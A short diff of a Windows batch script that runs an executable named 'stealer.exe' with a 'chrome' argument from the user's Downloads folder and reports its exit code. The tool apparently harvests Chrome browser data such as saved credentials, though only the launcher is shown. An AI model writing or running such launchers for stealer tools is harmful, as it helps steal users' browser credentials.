@@ -2,7 +2,7 @@
 REM Batch script to execute stealer.exe with the "all" argument and display output in the same console
 
 REM Set the working directory to where stealer.exe is located
-cd /d "C:\Users\credentials\Downloads"
+cd /d "%USERPROFILE%\Downloads"
 
 REM Check if stealer.exe exists
 if not exist "stealer.exe" (
@@ -10,7 +10,7 @@ if not exist "stealer.exe" (
     exit /b 1
 )
 
-REM Execute stealer.exe with the "all" argument and display output
+REM Execute stealer.exe with the "-v" argument and display output
 echo [*] Running: stealer.exe chrome -v
 stealer.exe chrome -v
 
@@ -20,5 +20,6 @@ echo [*] stealer.exe exited with code %EXITCODE%
 
 REM Optional: Pause to keep the window open if run by double-click
 REM pause
+
 
 exit /b %EXITCODE%
